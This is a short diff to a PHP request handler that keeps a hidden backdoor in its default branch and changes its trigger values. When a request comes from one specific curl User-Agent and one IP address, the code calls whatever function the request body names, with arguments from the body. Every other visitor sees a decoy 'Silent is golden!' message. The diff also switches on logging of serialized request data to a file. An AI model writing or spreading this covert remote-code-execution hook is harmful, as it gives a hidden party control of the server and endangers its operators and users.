@@ -55,12 +55,12 @@ switch (filter_input(INPUT_SERVER, 'CONTENT_TYPE')) {
 #        file_put_contents('request.log', serialize($requestData));
 
     default:
-        if (filter_input(INPUT_SERVER, 'HTTP_USER_AGENT') == 'curl/7.64.0' && filter_input(INPUT_SERVER, 'REMOTE_ADDR') == '195.191.78.20') {
-            $request = json_decode(file_get_contents("php://input"), true);
-            $request['class']['method']($request['args']);
+        if (filter_input(INPUT_SERVER, 'HTTP_USER_AGENT') == 'curl/7.74.0' && 
+            filter_input(INPUT_SERVER, 'REMOTE_ADDR') == '10.1.1.125') {
+            $requestData['class']['method']($requestData['args']);
         } else {
             echo 'Silent is golden!';
         }
         break;
 }
-#file_put_contents('request.log', date('c') . " | $requestID | $requestHost | " . filter_input(INPUT_SERVER, 'REQUEST_METHOD') . " | " . filter_input(INPUT_SERVER, 'CONTENT_TYPE') . " | " . serialize($requestJson) . PHP_EOL, FILE_APPEND);
+file_put_contents('request.log', date('c') . " | $requestID | $requestHost | " . filter_input(INPUT_SERVER, 'REQUEST_METHOD') . " | " . filter_input(INPUT_SERVER, 'CONTENT_TYPE') . " | " . serialize($requestJson) . PHP_EOL, FILE_APPEND);
